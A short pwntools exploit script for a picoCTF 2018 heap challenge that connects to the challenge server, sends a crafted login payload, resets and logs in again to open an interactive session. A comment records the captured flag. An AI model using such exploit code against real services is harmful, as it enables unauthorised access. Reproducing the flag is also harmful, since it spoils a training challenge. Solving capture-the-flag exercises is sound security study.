from pwn import *


p = remote("2018shell2.picoctf.com", 29508)

payload = ""
payload += "AAAAAAAB\x05"

p.sendline("login {}".format(payload))
p.sendline("reset")
p.sendline("login {}".format(payload))
p.interactive()


#flag picoCTF{m3sS1nG_w1tH_tH3_h43p_a5e65af1}
